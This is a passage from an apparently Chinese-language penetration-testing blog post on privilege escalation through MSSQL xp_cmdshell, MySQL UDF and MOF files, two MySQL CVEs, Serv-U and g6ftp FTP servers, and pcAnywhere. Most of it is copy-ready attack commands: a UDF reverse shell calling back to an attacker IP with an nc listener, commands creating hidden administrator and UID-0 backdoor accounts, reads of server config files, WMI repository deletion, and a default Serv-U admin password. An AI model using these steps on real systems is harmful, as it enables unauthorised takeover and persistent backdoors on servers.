@@version</span><br></pre></td></tr></table></figure><p>验证数据库的权限，sa账号是否被降权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select IS_SRVROLEMEMBER(&apos;sysadmin&apos;)#返回1是SA权限</span><br></pre></td></tr></table></figure></li><li><p>查看数据库中是否有xp_cmdshell扩展存储过程插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&apos;x&apos; and name=&apos;xp_cmdshell&apos;;</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype=&apos;x&apos; and name =&apos;xp_dirtree&apos;;</span><br><span class="line">#返回值不为0即可</span><br></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exec master..xp_cmdshell &apos;ipconfig&apos;</span><br><span class="line">Exec master..xp_dirtree &apos;/&apos;;</span><br></pre></td></tr></table></figure><p>如果如下报错：</p><blockquote><p>Error Message:SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。</p></blockquote><p>接下来这样操作，修复扩展存储过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#开启xp_cmdshell</span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><blockquote><p>配置选项 ‘show advanced options’ 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。<br>配置选项 ‘xp_cmdshell’ 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。</p><p>出现上面的提示（在你的连接工具中可能没有回显），则说明扩展存储过程已经添加完成</p></blockquote><p>继续执行命令即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master..xp_cmdshell &apos;ipconfig&apos;;</span><br></pre></td></tr></table></figure><p><strong>如果xp_cmdshell被删除</strong></p><p>重新加载该可扩展插件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#在系统中加载dll文件</span><br><span class="line">EXEC sp_addextendedproc xp_cmdshell,@dllname =&apos;xplog70.dll&apos;declare @o int; </span><br><span class="line">#重新绑定</span><br><span class="line">sp_addextendedproc &apos;xp_cmdshell&apos;, &apos;xpsql70.dll&apos;;</span><br><span class="line">#开启xp_cmdshell</span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p><strong>xp_cmdshell, xpsql70.dll 均被删除</strong></p><p><code>xpsql70.dll</code> 需要我们重新上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\</span><br></pre></td></tr></table></figure><p>接下来重新加载该可扩展插件即可。</p></li></ol><p><strong>sp_oacreate</strong></p><p>从SQL Server 2005 开始，xp_cmdshell默认是禁用的，而且执行xp_cmdshell可能会触发安全警报。下面介绍一些其它通过SQL Server 执行系统命令的方法。</p><p>在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权。</p><p>参考链接</p><p><a href="https://cloud.tencent.com/developer/article/1180237" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1180237</a></p><p><a href="https://www.cnblogs.com/xiao0/archive/2012/08/09/2630048.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiao0/archive/2012/08/09/2630048.html</a></p><p><strong>SQL Server CLR</strong></p><p><strong>Agent Job</strong></p><p>参考链接<a href="http://bobao.360.cn/learning/detail/3070.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3070.html</a></p><p><strong>其他方式</strong></p><p><a href="http://www.freebuf.com/column/142307.html" target="_blank" rel="noopener">http://www.freebuf.com/column/142307.html</a></p><h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><p><strong>利用MySQL提权原理：</strong></p><p>1、具有mysql的root权限，且mysql以system权限运行。<br>2、具有执行sql语句的权限，webshell或者外连皆可。</p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF是mysql的一个拓展接口（Userdefined function 用户自定义函数），是用来拓展Mysql的技术手段。</p><p>提权条件：</p><ol><li><p>拥有mysql的insert和delete权限</p></li><li><p>可以将udf.dll写入到相应目录的权限。</p></li></ol><p>提权方式：</p><ul><li><p><code>udf.php</code> </p></li><li><p>sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -d &quot;mysql://root:123456@219.115.1.1:3306/mysql&quot; --os-shell</span><br></pre></td></tr></table></figure></li><li><p>手动操作</p></li></ul><ol><li><p>收集信息</p><ul><li><p>用户信息(当前用户)</p></li><li><p>数据库信息(版本信息，位置)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select user();#当前用户</span><br><span class="line">select version();#数据库版本</span><br><span class="line">select @@basedir;#数据库位置</span><br><span class="line">show variables like &apos;%plugins%&apos;#查看数据库默认的插件存储位置</span><br></pre></td></tr></table></figure></li></ul></li><li><p>导出dll文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell(dll文件中的函数名) returns string soname &apos;myudf.dll&apos;;</span><br></pre></td></tr></table></figure><blockquote><p>myudf.dll文件在导出的过程中根据不同类型的数据库，放置的位置是不一样的。</p><p>mysql &lt;= 5.1的位置在 c:/windows/system32/</p><p>mysql  &gt;  5.1的位置 MySQL\Lib\Plugin\</p></blockquote><p>DLL文件通过c++、c#等将恶意shellcode封装到dll文件中，其中封装的函数名必须要知道（mycmd）</p><p>导入方式：</p><ul><li><p>通过菜刀等webshell管理工具直接上传（不一定能够上传成功）</p></li><li><p>找一个能够上传的地方，<code>c:\\tmp</code> 然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:\\temp\\myudf.dll&apos;) into dumpfile &apos;c:\\phpstudy\\MySQL\\lib\\plugin\\myudf.dll&apos;;</span><br></pre></td></tr></table></figure></li></ul><p>要求：</p><ol><li><p>lib下存在plugin目录；</p><p>没有目录需要创建：</p><ol><li><p>通过菜刀等webshell管理工具手工创建</p></li><li><p>NTFS ADS流写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   #查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;#利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&apos;系统命令&apos;)；#注意函数名</span><br></pre></td></tr></table></figure></li><li><p>删除函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop function cmdhell;#注意函数名</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;;</span><br><span class="line">#删除udf.dll</span><br></pre></td></tr></table></figure></li></ol><p><strong>无法获取webshell提权</strong></p><p>1.连接mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -h ip -uroot -p</span><br><span class="line">phpmyadmin</span><br><span class="line">Navicat for MySQL</span><br></pre></td></tr></table></figure><p>2.查看数据库版本和数据路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION( );</span><br><span class="line">Select @@datadir;</span><br><span class="line">5.1以下版本，将dll导入到c:/windows或者c:/windows/system32/</span><br><span class="line">5.1以上版本 通过以下查询来获取插件路径：</span><br><span class="line">SHOW VARIABLES WHERE Variable_Name LIKE &quot;%dir&quot;;</span><br><span class="line">show variables like &apos;%plugin%&apos; ;</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/httpd.conf&apos;)</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/vhosts.conf&apos;)</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/extra/vhosts.conf&apos;)</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/extra/httpd.conf&apos;)</span><br><span class="line">select load_file(&apos;d:/phpStudy/Apache/conf/vhosts.conf&apos;)</span><br></pre></td></tr></table></figure><p>3.修改mysql.txt</p><p>Mysql.txt为udf.dll的二进制文件转成十六进制代码。</p><p>（1）先执行导入ghost表中的内容</p><p>修改以下代码的末尾代码 select backshell(“YourIP”,4444);</p><p>（2）导出文件到某个目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:/windows/system32/mysql.dll</span><br><span class="line">c:/phpStudy/MySQL/lib/plugin/mysql.dll</span><br><span class="line">E:/PHPnow-1.5.6/MySQL-5.0.90/lib/plugin/mysql.dll</span><br><span class="line">select data from Ghost into dumpfile &apos;C:/websoft/MySQL/MySQL Server 5.5/lib/plugin/mysqldll.dll</span><br><span class="line">C:\Program Files\MySQL\MySQL Server 5.1\lib/plugin/mysqldll.dll</span><br></pre></td></tr></table></figure><p>（3）查看FUNCTION中是否存在cmdshell和backshell</p><p>存在则删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop FUNCTION cmdshell;//删除cmdshell</span><br><span class="line">drop FUNCTION backshell;//删除backshell</span><br></pre></td></tr></table></figure><p>创建backshell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell(&quot;192.192.192.1&quot;,44444);//修改192.192.192.1为你的IP和端口</span><br></pre></td></tr></table></figure><p>在具备独立主机的服务器上执行监听:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 44444</span><br></pre></td></tr></table></figure><p>执行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell(&quot;192.192.192.1&quot;,44444);//修改192.192.192.1为你的IP和端口</span><br></pre></td></tr></table></figure><p>4.获取webshell后添加用户命令</p><p>注意如果不能直接执行，则需要到<code>c:\windows\system32\</code>下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user antian365 www.xianzhi.aliyun.com /add </span><br><span class="line">net localgroup administrators antian365</span><br></pre></td></tr></table></figure><p><strong>反弹端口连接提权</strong></p><p>假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？</p><p>1、利用mysql客户端工具连接mysql服务器，然后执行下面的操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe -h 172.16.10.11 -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">mysql&gt; \. c:\mysql.txt</span><br><span class="line">mysql&gt;select backshell(&quot;YourIP&quot;,2010);</span><br></pre></td></tr></table></figure><p>2、本地监听你反弹的端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv -l -p 2010</span><br></pre></td></tr></table></figure><p>成功后，你将获得一个system权限的cmdshell，其实这个也是利用的UDF提权。</p><p>实验环境：phpStudy 默认安装的mysql数据库 5.5.40版本</p><p>mysql.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">set @a=concat(‘‘,[mysql.txt]);</span><br><span class="line">create table Ghost(data LONGBLOB);</span><br><span class="line">insert into Ghost values(&quot;&quot;);update Ghost set data = @a;</span><br><span class="line">select data from Ghost into DUMPFILE ‘c:\\windows\\system32\\udf.dll‘;</span><br><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME ‘udf.dll‘;</span><br><span class="line">select backshell(‘‘);</span><br></pre></td></tr></table></figure><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p><strong>利用条件：</strong></p><ul><li>windows系统，版本 <code>2003</code> 、<code>xp</code></li><li>mysql 版本低于5.7，原因开启了<code>secure-file-priv</code></li><li>已知数据库账号密码</li><li><code>c:/windows/system32/wbem/mof/</code>目录有写权限</li></ul><p><strong>MOF文件：</strong></p><p>mof是windows系统的一个文件，在 <code>c:/windows/system32/wbem/mof/nullevt.mof</code> 叫做 <code>托管对象格式</code> 其作用是每隔五秒就会去监控进程创建和死亡。</p><p><strong>提权原理：</strong></p><p>有了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><p>mof文件通过Mofcomp.exe编译执行。</p><p><strong>流程：</strong></p><ol><li><p>首先找个可写的目录，将我们的MOF文件上传上去。</p></li><li><p>执行以下sql语句，mof文件内的命令便会执行。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure><ol start="3"><li><p>提权后续处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt#停止服务</span><br><span class="line">rd/s/q C:\WINDOWS\system32\wbem\Repository\#删除文件夹</span><br><span class="line">net start winmgmt#启动服务</span><br></pre></td></tr></table></figure><blockquote><p>有一些局限性，系统限制和不好取得回显.</p></blockquote></li></ol><p><strong>快速提权方法：</strong></p><ul><li>mof.php/asp</li><li>Metasploit的exp模块</li><li>Cobalt strike</li></ul><h3 id="CVE-2016-6663-amp-4"><a href="#CVE-2016-6663-amp-4" class="headerlink" title="CVE-2016-6663&amp;4"></a>CVE-2016-6663&amp;4</h3><p><a href="https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">参考链接</a></p><p>上面两种方式条件都太过严苛，应对一些新的系统就没有用武之地了，所以再介绍一下利用下面两个CVE配合起来提权的方式，相对需求条件要宽松的多，很多情况都可以成功提权。</p><p><strong>CVE-2016-6663</strong></p><p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p><p><strong>CVE-2016-6664</strong></p><p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。</p><p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。</p><p>可以看到，两个cve分别是用来将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p><p><strong>CVE-2016-6663利用条件</strong></p><ul><li>1.已经getshell，获得www-data权限</li><li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li><li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li><li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li></ul><p><strong>CVE-2016-6664利用条件</strong></p><ul><li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）</li><li>2.需要在mysql权限下运行才能利用</li><li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li></ul><h2 id="FTP提权"><a href="#FTP提权" class="headerlink" title="FTP提权"></a>FTP提权</h2><p><strong>配置不当提权</strong></p><p>ftp用户拥有执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote site exec whoami</span><br></pre></td></tr></table></figure><p><strong>serv-u提权</strong></p><p>Serv-U是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令。</p><p>Serv-u&gt;3.x版本：</p><ul><li><p>默认本地管理端口是：<code>43958</code></p></li><li><p>默认管理员：<code>LocalAdministrator</code></p></li><li><p>默认密码：<code>#l@$ak#.lk;0@P</code></p></li></ul><p>这是集成在Serv-u内部的，可以以Guest权限来进行连接，对Serv-u进行管理。</p><p>可以通过连接serv-U然后执行操作系统命令的方式来添加具有管理权限的账户。</p><p>Webshell大马很多都会自带serv-U的提权功能，只需要输入要执行的命令即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 43958</span><br><span class="line">tasklist | findstr 4248</span><br><span class="line">C:\&gt; dir /s /d ServUDaemon.exe</span><br></pre></td></tr></table></figure><p>#下载<code>\Path\Serv-U6.4\ServUDaemon.exe</code>，使用UEditer打开查找<code>Administrator</code>，即可查找到账号密码</p><p><strong>g6ftp</strong></p><p>服务端口：8021</p><p>在任意帐户配置文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SiteCommandList0=-1,ADDUSER,C:\add.bat,0,60,0,0,</span><br><span class="line">SiteCommandList0=-1,TQ1,c:/a.bat,0,60,0,0,jid</span><br><span class="line">TQ1=命令名</span><br><span class="line">c:/a.bat=实际路径</span><br></pre></td></tr></table></figure><p>如果没有修改权限,也可以从本地走</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 8021</span><br><span class="line">tasklist | findstr 1592</span><br><span class="line">C:\&gt; dir /s /d G6FTPServer.exe</span><br><span class="line">Path\gene6ftpserver_cr173\RemoteAdmin\remote.ini</span><br></pre></td></tr></table></figure><p>查看<code>remote.ini</code>，找到password，cmd5破解出密码明文</p><p>使用lck等工具开启端口映射到其他端口，再通过该端口转发与远程服务器建立连接</p><p>通过shell，在目标系统写入bat脚本，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net user hack hack /add</span><br><span class="line">net localgroup administrators hack /add</span><br></pre></td></tr></table></figure><p>在服务端配置添加该脚本路径，访问时执行该命令即可成功执行bat脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote site hack</span><br></pre></td></tr></table></figure><h2 id="SMB提权"><a href="#SMB提权" class="headerlink" title="SMB提权"></a>SMB提权</h2><p><strong>ms17-010</strong></p><h2 id="RPC提权"><a href="#RPC提权" class="headerlink" title="RPC提权"></a>RPC提权</h2><p><strong>ms08-067</strong></p><h3 id="Pcanywhere提权"><a href="#Pcanywhere提权" class="headerlink" title="Pcanywhere提权"></a>Pcanywhere提权</h3><p>pcanywhere是赛门铁克公司出品的一款可以远程连接到服务器的远程桌面工具。</p><p><strong>原理：</strong><br>pcanywhere与windows自带的mstsc（远程桌面）不同的是，pcanywhere不使用windos操作系统的用户密码进行验证，而是用自身建立的用户密码进行验证。</p><p>只要获取到pcanywhere的登录密码，即可获取了服务器的远程桌面。</p><p><strong>密码文件存储位置：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Pcanywherepwd</span><br></pre></td></tr></table></figure><p>提权流程：</p><ol><li><p>服务器安装pcanywehre之后，会在其安装目录下生成相关的CIF文件，此文件的作用是保存了用户名与密码。</p></li><li><p>可以选择将CIF文件下载回本地破解（目前此方法多数已经失效），或者是根据其pcanywhere的版本在本地进行安装，然后建立一个自己知道的用户名密码。</p></li><li><p>将自身所产生的CIF文件上传至服务器并将服务器上的CIF文件替换掉。</p></li><li><p>使用Pcanywhere控制端连接服务器即可，账户密码使用自身刚才设置的那个账户密码。</p></li></ol><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="mysql提权-root权限"><a href="#mysql提权-root权限" class="headerlink" title="mysql提权(root权限)"></a>mysql提权(root权限)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">select sys_exec(&quot;usermod -aG admin &#123;user&#125;&quot;);</span><br><span class="line">exit</span><br><span class="line">sudo su root</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><strong>UDF提权</strong></p><p>参考链接：<a href="https://04z.net/archives/b4914d21.html" target="_blank" rel="noopener">https://04z.net/archives/b4914d21.html</a></p><p>利用条件：</p><ul><li><code>mysql-plugin</code>目录具有写入权限,并且获取路径</li><li>启动mysql的权限为root</li><li>获取到root账户口令[可以到user.MYD文件获取]</li><li>低版本mysql或者没有设置<code>skip‑grant‑tables</code></li></ul><p>注意点:</p><ul><li><code>INTO OUTFILE</code>不会覆盖文件</li><li><code>INTO OUTFILE</code>必须是查询语句的最后一句</li><li>路径名是不能编码的，必须使用单引号</li><li>函数是需要绝对路径</li><li><code>secure_file_priv</code>全局系统变量为空,那么直接可以使用函数,如果为null不能使用,该变量用于限制数据的导入和导出操作，例如<code>SELECT … INTO OUTFILE</code>语句和<code>LOAD_FILE()</code>，mysql的<code>5.5.53</code>之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li><li><code>INTO OUTFILE</code>函数写文件时会在每一行的结束自动加上换行符</li><li><code>INTO DUMPFILE</code>函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</li></ul><p><strong>1. 有可用的.so文件情况下,直接导入导出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a 确定系统位数x86 x64</span><br><span class="line">[mysqld]</span><br><span class="line">port        = 3306</span><br><span class="line">secure_file_priv =</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br><span class="line">select * from func;</span><br><span class="line">select hex(load_file(&apos;/xx/lib_mysqludf_sys.so&apos;)) into outfile &apos;/tmp/udf.txt&apos;;</span><br><span class="line">cat /tmp/udf.txt</span><br><span class="line">select unhex(&apos;7F454[udf内容]xx...&apos;) into dumpfile &apos;/usr/local/mysql/lib/plugin/mysqludf.so&apos;;</span><br></pre></td></tr></table></figure><p><strong>2. 上传到服务器,反弹shell并重新编译</strong></p><p>上传c文件到tmp目录下,使用gcc编译程序至plugin目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -I/usr/local/mysql/include/ -Os -shared lib_mysqludf_sys.c -fPIC -o /usr/local/mysql/lib/plugin/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure><p>删除之前并创建函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DROP FUNCTION IF EXISTS lib_mysqludf_sys_so;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_get;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_set;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_exec;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_eval;</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_get RETURNS string SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_set RETURNS int SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS int SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS string SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&apos;whoami&apos;);</span><br><span class="line">select sys_exec(&apos;id&apos;);</span><br><span class="line">select sys_exec(&apos;ifconfig&apos;);</span><br><span class="line">select sys_exec(&apos;useradd -u 0 -o -g root -G root -p `openssl passwd -1 -salt &apos;123&apos; evilfox123` evilfox&apos;);</span><br></pre></td></tr></table></figure><p><strong>3. 出现的问题</strong></p><p>编译</p><p>当编译时出现类似报错时,将<code>-I/usr/local/mysql/include/</code>替换成<code>my_globel.h</code>的主目录<br><code>lib_mysqludf_sys.c:40:23: fatal error: my_global.h: No such file or directory#include &lt;my_global.h&gt;</code></p><p>在mysql执行命令返回为null时,也有可能udf库没有系统环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown mysql:mysql /home/cassiano/teste/ -R</span><br></pre></td></tr></table></figure><p>skip-grant-tables</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can&apos;t initialize function &apos;backshell&apos;; UDFs are unavailable with the --skip-grant-tables option</span><br></pre></td></tr></table></figure><p>需要将my.ini中的skip-grant-tables选项去掉。</p><p>Function sys_eval already exists</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DROP FUNCTION IF EXISTS lib_mysqludf_sys_so;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_get;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_set;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_exec;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_eval;</span><br><span class="line">select * from mysql.plugin;</span><br><span class="line">delete from mysql.plugin;</span><br></pre></td></tr></table></figure><p>重启mysql服务即可</p><p><strong>4. sqlmap-udf-getshell</strong></p><p>存在注入点的情况下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">找到MySQL插件目录,然后利用sqlmap上传 